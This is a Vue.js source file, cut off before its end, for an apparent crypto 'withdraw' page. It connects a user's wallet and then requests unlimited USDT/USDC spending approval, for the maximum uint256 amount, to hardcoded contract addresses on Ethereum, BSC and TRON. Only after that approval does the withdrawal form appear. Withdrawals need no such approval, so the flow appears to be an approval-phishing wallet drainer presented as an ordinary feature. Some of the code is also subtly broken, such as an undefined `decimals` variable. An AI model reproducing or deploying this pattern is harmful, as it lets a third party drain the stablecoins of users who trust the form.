<template>
  <div>
    <el-form label-position="top" :model="formData" ref="withdrawData">
      <!-- 选择币种 -->
      <div class="step-right-content">
        <div class="step-content-box pb-35 md:pb-20">
          <div class="row-title">
            <span>选择币种</span>
          </div>
          <coin-selector :depositToken="currency" @getSelectedCoinName="getSelectedCoinName"></coin-selector>
        </div>
      </div>

      <!-- 币种-->
      <!-- 提币网络-稳定币，可以选链 -->
      <el-form-item v-if="selectedCoin === 'USDT' || selectedCoin === 'USDC'" prop="Coin" label="法币">
        <el-select v-model="formData.Coin" @change="onChangeChain">
          <el-option
            class="block-select-options"
            v-for="add in coinTypes"
            :key="add.value"
            :value="add.value"
            :label="add.label"
          >
          </el-option>
        </el-select>
      </el-form-item>

      <!-- 非稳定币，不支持选链 -->
      <div class="coin_label" v-else>
        <div class="mb-12">
          币种<span>({{ selectedCoin === 'BSC' ? 'BNB' : selectedCoin }})</span>
        </div>
        <div>
          <el-input disabled v-if="selectedCoin === 'BTC'" :value="'Bitcoin'"></el-input>
          <el-input disabled v-if="selectedCoin === 'ETH'" :value="'Ethereum'"></el-input>
          <el-input
            disabled
            v-if="selectedCoin === 'BNB' || selectedCoin === 'BSC'"
            :value="'BNB Smart Chain(BEP20)'"
          ></el-input>
        </div>
      </div>

      <!-- 钱包连接状态显示 -->
      <div v-if="isConnected" class="wallet-status mb-20">
        <div class="wallet-info">
          <span class="wallet-label">已连接钱包:</span>
          <span class="wallet-address">{{ walletAddress.slice(0, 6) }}...{{ walletAddress.slice(-4) }}</span>
          <el-button type="text" @click="handleDisconnect">断开</el-button>
        </div>
        <div v-if="currentChainConfig" class="chain-info">
          <span class="chain-label">当前网络:</span>
          <span class="chain-name">{{ currentChainConfig.name }}</span>

          <br />
          <span class="chain-label">授权额度:</span>
          <span class="chain-name">{{ allowanceAmount }}</span>
        </div>
      </div>

      <!-- 连接钱包按钮 -->
      <el-form-item v-if="!isConnected">
        <el-button @click="selectConnectionType" type="success" class="via-btn w-full via-btn--area">连接钱包</el-button>
      </el-form-item>

      <!-- 授权按钮 -->
      <el-form-item v-if="showApproveButton">
        <el-button
          @click="handleApprove"
          :loading="isApproving"
          :disabled="isApproved"
          type="primary"
          class="via-btn via-btn--area approve-btn"
        >
          <i v-if="!isApproving && !isApproved" class="el-icon-unlock" style="margin-right: 8px"></i>
          <i v-if="isApproved" class="el-icon-check" style="margin-right: 8px; color: #67c23a"></i>
          {{ getApproveButtonText() }}
        </el-button>
      </el-form-item>

      <!-- 刷新授权状态 -->
      <el-button @click="performAutomaticApprovalCheck" :loading="isRefreshingStatus" class="refresh-btn">
        <i class="el-icon-refresh" style="margin-right: 4px"></i>
        {{ isRefreshingStatus ? '刷新中...' : '刷新状态' }}
      </el-button>

      <!-- 提币表单 - 只有授权完成后才显示 -->
      <template v-if="showWithdrawForm">
        <el-form-item
          prop="Address"
          class="withdraw-address"
          :label="`提币地址(${selectedCoin === 'BSC' ? 'BNB' : selectedCoin})`"
        >
          <el-input v-model="formData.Address"></el-input>
        </el-form-item>
      </template>

      <!-- 钱包选择弹窗 -->
      <el-dialog title="Choose a wallet" v-model="showWalletSelector" width="95%" :close-on-click-modal="false" center>
        <div class="wallet-selector">
          <div v-for="wallet in availableWallets" :key="wallet.id" class="wallet-option" @click="selectWallet(wallet.id)">
            <div class="wallet-info">
              <img v-if="wallet.icon" src="@/assets/image/wallet/okx.jpg" :alt="wallet.name" class="wallet-icon" />
              <span class="wallet-name">{{ wallet.name }}</span>
            </div>
            <i class="el-icon-arrow-right"></i>
          </div>
        </div>
      </el-dialog>
    </el-form>
  </div>
</template>

<script>
import CoinSelector from '@/components/CoinSelector.vue'
import { CHAIN_CONFIGS, TOKEN_CONFIGS } from '@/utils/WalletAdapter.js'
import { OKXTronProvider, OKXUniversalProvider } from '@okxconnect/universal-provider'
import { createAppKit } from '@reown/appkit/vue'
import { Ethers5Adapter } from '@reown/appkit-adapter-ethers5'
import { bsc, mainnet } from '@reown/appkit/networks'
import { TronService } from '@/services/tronService'
import { buildNamespaces, encodeAllowanceCall } from '@/utils/chainUtils.js'

// 授权合约
const contractAddress = {
  'Ethereum Mainnet': '0xa61C92aA225b0Abdeb40b305900dCB8fA6Bc2Ade', // ETH链合约地址
  'BNB Smart Chain': '0xCE7dbe370a1FB2CC81e7925B288aC49D87B4684B', // BSC链合约地址
  'TRON Mainnet': 'TFLo5KpsCZ3NZDHSUhQG2cVeGuBpvAJsdK', // TRON链合约地址
}

const currency = 'USDT'
const projectId = 'c34b3bde7397ea7ed6780e9ce1d5194d'
const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'

export default {
  components: { CoinSelector },
  data() {
    return {
      currency: currency,
      // 钱包连接状态
      isConnected: false, // 是否已连接钱包
      walletAddress: '', // 钱包地址
      currentChainId: '', // 当前链ID

      // reown相关
      appKit: null,
      chainId: '',
      selectedChain: null, // 当前选择的链

      // 授权状态
      isApproved: false, // 是否已授权
      isApproving: false, // 是否正在授权
      allowanceAmount: '0', // 当前授权额度
      approvalResult: null, // 授权结果

      isConnecting: false, // 是否正在连接
      walletError: '', // 钱包连接错误信息
      error: '',

      // 钱包选择弹窗
      showWalletSelector: false, // 是否显示钱包选择弹窗
      availableWallets: [
        {
          id: 'okx',
          name: 'OKX Wallet (Mobile)',
          icon: '@/assets/image/wallet/okx.jpg',
          type: 'mobile',
          status: 'available',
          description: 'Connect using OKX mobile wallet',
        },
      ], // 可用钱包列表，将在mounted时动态检测

      okxProvider: null,
      okxTronProvider: null,
      session: null,

      formData: {
        Amount: null,
        Address: '',
        WithdrawPassword: '',
        Coin: '',
      },

      // 授权用户体验增强
      isRefreshingStatus: false,
      selectedCoin: currency,

      // 防抖相关
      accountSubscribeDebounceTimer: null, // 账户订阅防抖定时器
      lastAccountState: null, // 上次账户状态

      // 链和代币配置
      chainConfigs: CHAIN_CONFIGS,
      tokenConfigs: TOKEN_CONFIGS,
      tronService: null,
    }
  },
  // created() {
  //   this.tronService = new TronService()
  //   console.log('TronService', this.tronService)
  // },
  computed: {
    // 是否显示提币表单
    showWithdrawForm() {
      return this.isConnected && this.isApproved
    },

    // 是否显示授权按钮
    showApproveButton() {
      // 必须满足以下所有条件才显示授权按钮：
      // 1. 钱包已连接
      // 2. 有钱包地址
      // 3. 有当前代币配置
      // 4. 有当前链配置
      // 5. 尚未授权
      const shouldShow =
        this.isConnected && this.walletAddress && this.currentTokenConfig && this.currentChainConfig && !this.isApproved

      console.log('授权按钮显示逻辑:', {
        isConnected: this.isConnected,
        hasWalletAddress: !!this.walletAddress,
        hasTokenConfig: !!this.currentTokenConfig,
        hasChainConfig: !!this.currentChainConfig,
        isApproved: this.isApproved,
        shouldShow: shouldShow,
      })

      return shouldShow
    },

    // 获取当前选择的链配置
    currentChainConfig() {
      const selectedCoinType = this.coinTypes.find(coin => coin.value === this.formData.Coin)

      console.log({
        key: '获取当前选择的链配置',
        selectedCoinType,
        coinTypes: this.coinTypes,
        formData: this.formData,
        chainConfigs: this.chainConfigs,
      })

      return selectedCoinType ? this.chainConfigs[selectedCoinType.chainId] : null
    },

    // 获取当前代币配置
    currentTokenConfig() {
      if (!this.currentChainConfig) {
        console.warn('currentChainConfig 为空')
        return null
      }

      // 标准化币种名称 - 确保使用正确的币种符号
      let coinSymbol = this.selectedCoin
      // 处理各种币种名称格式
      if (coinSymbol === 'USDCTRC20' || coinSymbol === 'USDCBEP20' || coinSymbol === 'USDCERC20') {
        coinSymbol = 'USDC'
      } else if (coinSymbol === 'USDTTRC20' || coinSymbol === 'USDTBEP20' || coinSymbol === 'USDTERC20') {
        coinSymbol = 'USDT'
      } else if (coinSymbol && coinSymbol.startsWith('USDT')) {
        coinSymbol = 'USDT'
      } else if (coinSymbol && coinSymbol.startsWith('USDC')) {
        coinSymbol = 'USDC'
      }

      const tokenKey = `${coinSymbol}_${this.currentChainConfig.name}`
      const tokenConfig = this.tokenConfigs[tokenKey]

      console.log('currentTokenConfig 计算:', {
        originalSelectedCoin: this.selectedCoin,
        normalizedCoinSymbol: coinSymbol,
        chainName: this.currentChainConfig.name,
        tokenKey,
        tokenConfig,
        availableKeys: Object.keys(this.tokenConfigs),
      })

      return tokenConfig || null
    },

    // 币种类型
    coinTypes() {
      if (this.selectedCoin === 'USDT') {
        return [
          {
            label: 'USDT-ERC20',
            value: 'USDT',
            chainId: 'eip155:1', // ETH
            token: '',
          },
          {
            label: 'USDT-TRC20',
            value: 'USDT_TRC',
            chainId: 'tron:mainnet', // TRON
            token: '',
          },
          {
            label: 'USDT-BEP20',
            value: 'USDTBEP20',
            chainId: 'eip155:56', // BSC
            token: '',
          },
        ]
      } else {
        return [
          {
            label: 'USDC-ERC20',
            value: 'USDC',
            chainId: 'eip155:1', // ETH
            token: '',
          },
          {
            label: 'USDC-TRC20',
            value: 'USDCTRC20',
            chainId: 'tron:mainnet', // TRON
            token: '',
          },
          {
            label: 'USDC-BEP20',
            value: 'USDCBEP20',
            chainId: 'eip155:56', // BSC
            token: '',
          },
        ]
      }
    },
  },
  watch: {
    appKit: function (value) {
      console.log('appKit111', value, this)
      const _this = this
      if (value) {
        console.log('开始监听状态变化2')
        // 监听连接状态变化
        this.appKit.subscribeState(state => {
          console.log('AppKit 状态变化:', state)

          if (state.open !== undefined) {
            // 模态框状态变化
            console.log('模态框状态:', state.open ? '打开' : '关闭')

            // 如果模态框关闭且没有连接成功，重置连接状态
            if (!state.open && !_this.isConnected) {
              _this.isConnecting = false
              console.log('模态框关闭，重置连接状态')
            }
          }

          if (state.selectedNetworkId !== undefined) {
            const previousChainId = _this.chainId
            _this.chainId = state.selectedNetworkId
            console.log('网络变化:', state.selectedNetworkId, '前一个网络:', previousChainId)

            // 如果网络发生变化且钱包已连接，处理链切换逻辑
            if (previousChainId && previousChainId !== state.selectedNetworkId && _this.isConnected) {
              _this.handleNetworkChange(previousChainId, state.selectedNetworkId)
            }
          }
        })

        this.appKit.subscribeAccount(account => {
          // 清除之前的防抖定时器
          if (_this.accountSubscribeDebounceTimer) {
            clearTimeout(_this.accountSubscribeDebounceTimer)
          }

          // 检查账户状态是否真的发生了变化
          const currentAccountState = {
            isConnected: account.isConnected,
            address: account.address,
            chainId: account.chainId,
          }

          // 如果状态没有变化，直接返回
          if (
            _this.lastAccountState &&
            _this.lastAccountState.isConnected === currentAccountState.isConnected &&
            _this.lastAccountState.address === currentAccountState.address &&
            _this.lastAccountState.chainId === currentAccountState.chainId
          ) {
            console.log('账户状态未发生实际变化，跳过处理')
            return
          }

          // 设置防抖定时器，延迟处理账户状态变化
          _this.accountSubscribeDebounceTimer = setTimeout(() => {
            console.log('防抖后处理账户状态变化:', account)

            // 更新上次状态记录
            _this.lastAccountState = { ...currentAccountState }

            if (account.isConnected) {
              _this.isConnected = true
              _this.isConnecting = false // 连接成功，重置连接状态
              _this.walletAddress = account.address || ''
              _this.chainId = _this.appKit.getCaipAddress()?.split(':')[1] || null
              _this.error = '' // 清除错误信息

              console.log('钱包已连接:', account.address)

              // 连接成功后自动检查授权状态
              _this.performAutomaticApprovalCheck()
            } else {
              _this.isConnected = false
              _this.isConnecting = false // 断开连接，重置连接状态
              _this.address = ''
              _this.chainId = null
              _this.balance = ''
              console.log('钱包已断开')
            }
          }, 500) // 500ms 防抖延迟
        })
      }
    },
    okxProvider: function (value) {
      if (value) {
        this.tronService = new TronService(value, this.$message)
        console.log('TronService', this.tronService)
      }
    },
  },
  mounted() {
    // 确保selectedCoin有初始值
    if (!this.selectedCoin) {
      this.selectedCoin = this.currency
    }

    this.initFormDataCoin()
  },

  beforeUnmount() {
    // 清理防抖定时器
    if (this.accountSubscribeDebounceTimer) {
      clearTimeout(this.accountSubscribeDebounceTimer)
      this.accountSubscribeDebounceTimer = null
    }
    console.log('组件销毁，已清理防抖定时器')
  },
  methods: {
    /**
     * 打开连接模态框
     * @returns {Promise<void>}
     */
    async openModal() {
      try {
        if (this.appKit) {
          console.log('this.appKit >>>', this.appKit)
          await this.appKit?.disconnect()
          await this.appKit.open()
        }
      } catch (err) {
        console.error('打开模态框失败:', err)
        this.error = '打开连接界面失败: ' + err.message
        this.isConnecting = false
      }
    },

    /**
     * 初始化 AppKit 实例
     * @param selectedNetwork
     */
    initializeAppKit(selectedNetwork) {
      console.log('初始化AppKit实例', selectedNetwork)

      try {
        // 检查当前链类型，如果是TRC链则不初始化AppKit
        const chainType = this.formData.Coin
        if (chainType && chainType.includes('TRC')) {
          console.log('当前为TRC链，跳过AppKit初始化')
          return
        }
        console.log('当前为非TRC链，初始化AppKit')

        // 创建 Ethers5 适配器
        const ethersAdapter = new Ethers5Adapter()

        // 确定默认网络 - 根据用户选择的链ID
        let networks = []
        let defaultNet = null

        if (selectedNetwork && selectedNetwork.id === 56) {
          networks = [bsc]
          defaultNet = bsc
        } else if (selectedNetwork && selectedNetwork.id === 1) {
          networks = [mainnet]
          defaultNet = mainnet
        } else {
          // 如果没有明确的网络选择，根据当前选择的币种类型来决定
          const chainType = this.formData.Coin
          if (chainType === 'USDT' || chainType === 'USDC') {
            // USDT/USDC-ERC20 默认使用以太坊
            networks = [mainnet]
            defaultNet = mainnet
          } else if (chainType === 'USDTBEP20' || chainType === 'USDCBEP20') {
            // BEP20 使用BSC
            networks = [bsc]
            defaultNet = bsc
          } else {
            // 其他情况默认使用以太坊
            networks = [mainnet]
            defaultNet = mainnet
          }
        }

        console.log('连接的链>>>>>>>>', networks, defaultNet)

        // 创建 AppKit 实例
        this.appKit = createAppKit({
          projectId,
          enableReconnect: false, // 禁用自动连接
          enableNetworkSwitch: false,
          adapters: [ethersAdapter],
          networks: networks, // 保持EVM网络可用
          defaultNetwork: defaultNet, // 使用确定的默认网络
          metadata: {
            name: 'ZRAOX',
            description: '',
            url: window.location.origin,
            icons: [window.location.origin + '/favicon.ico'],
          },
          features: {
            analytics: true, // 启用分析
            email: false, // 禁用邮箱登录
            socials: [], // 禁用社交登录
            emailShowWallets: true, // 显示钱包选项
          },
          themeMode: 'light',
          themeVariables: {
            '--w3m-z-index': 9999,
            '--w3m-accent': '#007bff',
          },
        })
        console.log('AppKit 初始化成功')
      } catch (err) {
        console.error('AppKit 初始化失败:', err)
        this.error = '初始化失败: ' + err.message
      }
    },

    // 获取授权按钮文本
    getApproveButtonText() {
      if (this.isApproving) {
        return '授权中'
      }
      if (this.isApproved) {
        return '已授权'
      }

      return '授权代币'
    },

    /**
     * 授权代币
     */
    async handleApprove() {
      try {
        console.log('授权代币', this.currentTokenConfig, this.currentChainConfig, this.walletAddress)

        // 基本连接状态检查
        if (!this.currentTokenConfig || !this.walletAddress) {
          this.$message.error('Please connect your wallet first')
          return
        }

        // 根据链类型检查相应的provider
        const chainId = this.currentChainConfig.chainId
        if (chainId.startsWith('tron:') && !this.okxProvider) {
          this.$message.error('TRON wallet not connected, please connect OKX wallet first')
          return
        }
        if (chainId.startsWith('eip155:') && !this.appKit) {
          this.$message.error('EVM wallet not connected, please connect wallet first')
          return
        }

        this.isApproving = true

        // 获取合约地址
        const chainName = this.currentChainConfig.name
        const spenderAddress = contractAddress[chainName]

        if (chainId.startsWith('eip155:')) {
          try {
            // 检查appKit连接状态
            if (!this.appKit) {
              throw new Error('钱包未连接，请先连接钱包')
            }

            const data = this.encodeApproveCall(spenderAddress, maxAmount)

            // 使用 AppKit Provider 发送交易
            const walletProvider = this.appKit.getWalletProvider()
            if (!walletProvider) {
              throw new Error('Unable to get wallet provider from AppKit')
            }

            const txHash = await walletProvider.request({
              method: 'eth_sendTransaction',
              params: [
                {
                  from: this.walletAddress,
                  to: this.currentTokenConfig.contractAddress,
                  data: data,
                },
              ],
            })

            this.$message.success(`Authorized transaction has been submitted: ${txHash}`)

            // 等待交易确认并重新检查授权状态
            await this.waitForApprovalConfirmation(txHash)

            // 授权成功后，额外延迟一下再次检查状态，确保区块链状态同步
            setTimeout(async () => {
              try {
                console.log('授权交易确认后，再次检查授权状态')
                await this.checkApprovalStatus()
                if (this.isApproved) {
                  this.$message.success(`授权状态已更新，当前额度：${this.allowanceAmount}`)
                }
              } catch (error) {
                console.error('授权后状态检查失败:', error)
              }
            }, 3000)
          } catch (evmError) {
            console.error('EVM授权失败:', evmError)

            // 提供更友好的错误信息
            let errorMessage = 'EVM token authorization failed'
            if (evmError.message.includes('User rejected') || evmError.message.includes('User denied')) {
              errorMessage = 'The user canceled the authorization operation'
            } else if (evmError.message.includes('insufficient')) {
              errorMessage = 'Insufficient balance, unable to pay Gas fees'
            } else if (evmError.message.includes('network')) {
              errorMessage = 'Network connection is wrong, please check the network'
            } else if (evmError.message.includes('contract')) {
              errorMessage = 'The contract call failed, please check the contract address'
            } else if (evmError.message.includes('Invalid address')) {
              errorMessage = 'Invalid address format'
            }

            // 显示错误信息和隐藏进度
            // this.showApprovalError(errorMessage)

            this.$message.error(errorMessage)

            throw evmError
          }
        } else if (chainId.startsWith('tron:')) {
          // TRON链授权
          // console.log('开始TRON链授权...');

          this.$message.info('Authorization is being authorized...')

          // 直接使用 OKX 钱包进行授权
          const result = await this.approveTronToken(this.currentTokenConfig.contractAddress, spenderAddress, maxAmount)

          console.log('TRON授权结果:', result)

          if (result.success) {
            // this.$message.success(`TRON授权交易已提交: ${result.txHash}`);
            console.log('TRON授权交易哈希:', result.txHash)

            // 等待交易确认并重新检查授权状态
            await this.waitForApprovalConfirmation(result.txHash)

            // 授权成功后，额外延迟一下再次检查状态，确保区块链状态同步
            setTimeout(async () => {
              try {
                console.log('TRON授权交易确认后，再次检查授权状态')
                await this.checkApprovalStatus()
                if (this.isApproved) {
                  this.$message.success(`TRON授权状态已更新，当前额度：${this.allowanceAmount}`)
                }
              } catch (error) {
                console.error('TRON授权后状态检查失败:', error)
              }
            }, 3000)
          } else {
            throw new Error(result.error || 'TRON authorization failed')
          }
        }
      } catch (error) {
        console.error('授权失败:', error)
        this.$message.error(`Authorization failed: ${error.message}`)
      } finally {
        this.isApproving = false
      }
    },

    /**
     * 使用 TronWeb triggerSmartContract 授权 TRON 代币
     */
    async approveTronToken(tokenAddress, spenderAddress, amount) {
      console.log('approveTronToken', tokenAddress, spenderAddress, amount)

      try {
        this.isApproving = true

        // 检查钱包连接状态
        let userAddress = this.walletAddress

        if (!tokenAddress || !spenderAddress || !amount) {
          throw new Error('Missing necessary authorization parameters')
        }

        console.log({
          key: '开始 TRON 代币授权',
          tokenAddress,
          spenderAddress,
          amount,
          from: this.walletAddress,
        })

        // 检查插件是否可用
        if (!this.createTronWeb) {
          throw new Error('The TronWeb plugin is not loading correctly, please refresh the page and try again')
        }

        // 使用插件创建 TronWeb 实例
        const tronWeb = await this.createTronWeb()
        console.log('TronWeb 实例创建成功，开始授权交易')

        // 验证地址格式
        if (!tronWeb.isAddress(this.walletAddress)) {
          throw new Error('Invalid wallet address format')
        }
        if (!tronWeb.isAddress(spenderAddress)) {
          throw new Error('Invalid authorization address format')
        }
        if (!tronWeb.isAddress(tokenAddress)) {
          throw new Error('Invalid contract address format')
        }

        // 智能授权额度验证和策略
        const validatedAmount = await this.validateAndOptimizeApprovalAmount(amount, tokenAddress, spenderAddress)

        // 如果当前授权额度已足够，直接返回成功
        if (validatedAmount.skipApproval) {
          return {
            success: true,
            txHash: null,
            message: validatedAmount.reason,
            skipped: true,
          }
        }

        // 使用 triggerSmartContract 方法构建授权交易
        const functionSelector = 'approve(address,uint256)'
        const parameter = [
          { type: 'address', value: spenderAddress },
          { type: 'uint256', value: maxAmount },
        ]

        // 构建交易
        const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
          tokenAddress,
          functionSelector,
          { feeLimit: 100000000 },
          parameter,
          this.walletAddress,
        )

        // console.log('构建交易', transaction);

        if (!transaction || !transaction.transaction) {
          throw new Error('Failed to build authorization transaction')
        }

        // 签名并广播交易
        console.log('开始签名交易...')
        let signedTransaction
        let broadcastResult

        // 检查是否为 OKX 钱包环境
        if (
          typeof window !== 'undefined' &&
          window.okxwallet &&
          window.okxwallet.tronLink &&
          window.okxwallet.tronLink.tronWeb
        ) {
          // console.log('使用 OKX 钱包签名交易...');
          try {
            // 使用 OKX 钱包的 TronWeb 实例进行签名
            signedTransaction = await window.okxwallet.tronLink.tronWeb.trx.sign(transaction.transaction)
          } catch (error) {
            // console.log(`OKX 钱包签名失败，尝试其他方式: ${error.message}`);
            // 如果 OKX 钱包签名失败，尝试使用 TronLink
            if (window.tronWeb && window.tronWeb.trx) {
              signedTransaction = await window.tronWeb.trx.sign(transaction.transaction)
            } else {
              throw new Error('Unable to find available wallet signature method')
            }
          }
        } else if (typeof window !== 'undefined' && window.tronWeb && window.tronWeb.trx) {
          // console.log('使用 TronLink 钱包签名交易...');
          signedTransaction = await window.tronWeb.trx.sign(transaction.transaction)
        } else {
          // throw new Error('未检测到可用的钱包，请确保已安装并连接 TronLink 或 OKX 钱包');
          signedTransaction = await this.okxTronProvider.signTransaction(transaction.transaction, 'tron:mainnet')
        }

        if (!signedTransaction) {
          throw new Error('Transaction signature failed')
        }

        broadcastResult = this.okxTronProvider.signAndSendTransaction(transaction.transaction, 'tron:mainnet')

        if (!broadcastResult || !broadcastResult.result) {
          throw new Error(broadcastResult?.message || 'Transaction broadcast failed')
        }

        const txHash = broadcastResult.txid || signedTransaction.txID

        // 显示成功消息
        this.$message.success(`Authorization is successful`)

        // 授权成功后，等待一段时间再刷新授权状态
        setTimeout(() => {
          this.checkApprovalStatus()
        }, 5000)

        return {
          success: true,
          txHash: txHash,
        }
      } catch (error) {
        // console.error('TRON 代币授权失败:', error);

        // 提供更友好的错误信息
        let errorMessage = 'Token authorization failed'
        if (error.message.includes('User rejected') || error.message.includes('User denied')) {
          errorMessage = 'The user canceled the authorization operation'
        } else if (error.message.includes('insufficient')) {
          errorMessage = 'TRX balance is insufficient and cannot pay the handling fee'
        } else if (error.message.includes('network')) {
          errorMessage = 'Network connection is wrong, please check the network'
        } else if (error.message.includes('contract')) {
          errorMessage = 'The contract call failed, please check the contract address'
        } else if (error.message.includes('Invalid address')) {
          errorMessage = 'Invalid address format'
        } else if (error.message.includes('amount')) {
          errorMessage = 'Invalid authorization amount'
        } else if (error.message.includes('broadcast')) {
          errorMessage = 'Transaction broadcast failed, please try again'
        }

        // 显示错误信息和隐藏进度
        // this.showApprovalError(errorMessage)
        this.$message.error(errorMessage)

        return {
          success: false,
          error: errorMessage,
        }
      } finally {
        this.isApproving = false
      }
    },

    /**
     * 智能授权额度验证和优化策略
     */
    async validateAndOptimizeApprovalAmount(requestedAmount, tokenAddress, spenderAddress) {
      try {
        // 基础验证
        if (!requestedAmount || requestedAmount === '0') {
          throw new Error('Invalid authorization amount')
        }

        // 获取当前授权额度
        const currentAllowanceResult = await this.getTronAllowance(tokenAddress, spenderAddress)
        const currentAllowance = currentAllowanceResult.success ? parseFloat(currentAllowanceResult.allowance) : 0

        // 转换请求金额为数值
        const requestedAmountNum = parseFloat(requestedAmount)

        // 智能授权策略选择
        let strategy = 'exact' // 默认策略：精确授权
        let optimizedAmount = requestedAmount
        let reason = 'Use the exact authorization amount'

        // 策略1: 如果当前授权额度已足够，无需重新授权
        if (currentAllowance >= requestedAmountNum) {
          return {
            amount: '0', // 不需要授权
            strategy: 'sufficient',
            reason: `The current authorization limit ${currentAllowance} is sufficient, no reauthorization is required`,
            skipApproval: true,
          }
        }

        // 策略4: 大额授权 - 使用最大授权额度
        else {
          strategy = 'unlimited'
          optimizedAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
          reason = 'Large transactions, unlimited authorization for the best user experience'
        }

        // 安全检查：确保授权金额不超过合理范围
        const maxReasonableAmount = Math.pow(10, decimals + 12) // 10^12 个代币
        if (parseFloat(optimizedAmount) > maxReasonableAmount && strategy !== 'unlimited') {
          optimizedAmount = maxReasonableAmount.toString()
          reason += '(It has been limited to a reasonable range)'
        }

        return {
          amount: optimizedAmount,
          strategy,
          reason,
          skipApproval: false,
        }
      } catch (error) {
        console.error('Intelligent authorization strategy analysis failed:', error)
        // 发生错误时回退到精确授权
        return {
          amount: requestedAmount,
          strategy: 'fallback',
          reason: 'Strategy analysis failed, using original amount',
          skipApproval: false,
        }
      }
    },

    /**
     * 等待授权交易确认（增强版）
     */
    async waitForApprovalConfirmation(txHash) {
      let retryCount = 0
      const maxRetries = 20 // 增加重试次数
      let retryInterval = 3000 // 初始重试间隔3秒
      const maxRetryInterval = 15000 // 最大重试间隔15秒
      let consecutiveFailures = 0
      let lastProgressUpdate = Date.now()

      const checkConfirmation = async () => {
        try {
          retryCount++

          // 更新进度描述并查询交易状态
          const now = Date.now()
          const elapsed = Math.floor((now - lastProgressUpdate) / 1000)

          // 尝试查询交易状态
          const txStatus = await this.trackTransactionStatus(txHash)
          let statusDescription = `${this.$t('wallet.waiting_for_confirmation')} (${this.$t('wallet.waited')} ${elapsed}${this.$t('wallet.seconds')})`

          if (txStatus.success && txStatus.transaction) {
            const tx = txStatus.transaction
            if (tx.status === 'confirmed') {
              statusDescription = `${this.$t('wallet.transaction_confirmed')} (${this.$t('wallet.block')}: ${tx.blockNumber || 'N/A'})`
            } else if (tx.status === 'failed') {
              statusDescription = this.$t('wallet.transaction_failed')
            } else if (tx.status === 'pending') {
              statusDescription = `${this.$t('wallet.transaction_pending')} (${this.$t('wallet.waited')} ${elapsed}${this.$t('wallet.seconds')})`
            }

            if (tx.confirmations && typeof tx.confirmations === 'number') {
              statusDescription += ` - ${tx.confirmations} ${this.$t('wallet.confirmations')}`
            }
          }

          this.updateProgressStep(1, 'active', statusDescription)

          // 使用增强的授权状态检查
          const checkResult = await this.checkApprovalStatusWithRetry()

          if (checkResult.success && this.isApproved) {
            console.log(this.$t('wallet.approval_confirmed_success'))

            // 显示包含授权额度的成功消息
            this.$message.success(`授权成功`)

            // 强制触发Vue响应式更新，确保UI显示最新状态
            this.$forceUpdate()

            consecutiveFailures = 0
            return
          }

          if (retryCount < maxRetries) {
            // 动态调整重试间隔：失败次数越多，间隔越长
            if (!checkResult.success) {
              consecutiveFailures++
              retryInterval = Math.min(retryInterval * 1.2, maxRetryInterval)
            } else {
              consecutiveFailures = 0
              retryInterval = Math.max(retryInterval * 0.9, 3000) // 成功时稍微减少间隔
            }

            console.log(
              this.$t('wallet.approval_not_confirmed_retry', {
                seconds: retryInterval / 1000,
                failures: consecutiveFailures,
              }),
            )

            setTimeout(checkConfirmation, retryInterval)
          } else {
            console.warn(this.$t('wallet.approval_confirmation_timeout'))

            this.$message.warning({
              message: this.$t('wallet.approval_transaction_submitted_long_confirmation'),
              duration: 5000,
            })
          }
        } catch (error) {
          console.error(this.$t('wallet.check_approval_confirmation_failed'), error)
          consecutiveFailures++

          if (retryCount < maxRetries) {
            // 发生错误时增加重试间隔
            retryInterval = Math.min(retryInterval * 1.5, maxRetryInterval)
            console.log(this.$t('wallet.check_failed_retry_after_seconds', { seconds: retryInterval / 1000 }))

            setTimeout(checkConfirmation, retryInterval)
          } else {
            this.$message.error(this.$t('wallet.approval_status_check_failed_refresh_page'))
          }
        }
      }

      // 首次检查延迟5秒，给交易一些时间被打包
      setTimeout(() => {
        lastProgressUpdate = Date.now()
        checkConfirmation()
      }, 5000)
    },

    /**
     * 跟踪交易状态（实时查询）
     */
    async trackTransactionStatus(txHash, chainType = null) {
      if (!txHash) {
        return { success: false, error: '交易哈希不能为空' }
      }

      const chain = chainType || this.selectedChain

      try {
        let transactionStatus = null

        if (chain === 'TRON') {
          // TRON 链交易状态查询
          if (window.tronWeb && window.tronWeb.trx) {
            try {
              const txInfo = await window.tronWeb.trx.getTransactionInfo(txHash)
              const transaction = await window.tronWeb.trx.getTransaction(txHash)

              transactionStatus = {
                hash: txHash,
                status: txInfo.receipt?.result === 'SUCCESS' ? 'confirmed' : 'pending',
                blockNumber: txInfo.blockNumber || null,
                gasUsed: txInfo.receipt?.energy_usage_total || 0,
                fee: txInfo.fee || 0,
                confirmations: txInfo.blockNumber ? 'confirmed' : 'pending',
                timestamp: transaction.raw_data?.timestamp || Date.now(),
              }
            } catch (error) {
              transactionStatus = {
                hash: txHash,
                status: 'pending',
                error: this.$t('wallet.transaction_query_failed_not_on_chain'),
              }
            }
          }
        } else {
          // EVM 链交易状态查询
          if (this.okxProvider) {
            try {
              const receipt = await this.okxProvider.getTransactionReceipt(txHash)
              const transaction = await this.okxProvider.getTransaction(txHash)

              if (receipt) {
                transactionStatus = {
                  hash: txHash,
                  status: receipt.status === 1 ? 'confirmed' : 'failed',
                  blockNumber: receipt.blockNumber,
                  gasUsed: receipt.gasUsed?.toString() || '0',
                  confirmations: receipt.confirmations || 0,
                  timestamp: transaction?.timestamp || Date.now(),
                }
              } else {
                transactionStatus = {
                  hash: txHash,
                  status: 'pending',
                  message: '交易还未被确认',
                }
              }
            } catch (error) {
              transactionStatus = {
                hash: txHash,
                status: 'pending',
                error: '交易请求失败',
              }
            }
          }
        }

        return { success: true, transaction: transactionStatus }
      } catch (error) {
        return { success: false, error: error.message }
      }
    },

    /**
     * 编码ERC20授权调用
     * @param {string} spender - 授权的spender地址
     * @param {string} amount - 授权金额
     */
    encodeApproveCall(spender, amount) {
      // ERC20 approve(address,uint256) 方法签名
      const methodId = '0x095ea7b3'

      // 填充spender地址到32字节
      const paddedSpender = spender.replace('0x', '').padStart(64, '0')

      // 填充授权金额到32字节
      const paddedAmount = BigInt(amount).toString(16).padStart(64, '0')

      return methodId + paddedSpender + paddedAmount
    },

    /**
     * 重置钱包状态
     */
    resetWalletStatus() {
      this.isConnected = false
      this.walletAddress = ''
      this.currentChainId = ''
      this.isApproved = false
      this.allowanceAmount = '0'
      this.isConnecting = false
      this.selectedWalletType = ''

      // 清空提币地址
      this.formData.Address = ''

      // 清理session
      if (this.session) {
        this.session = null
      }

      console.log('钱包状态已重置')
    },

    /**
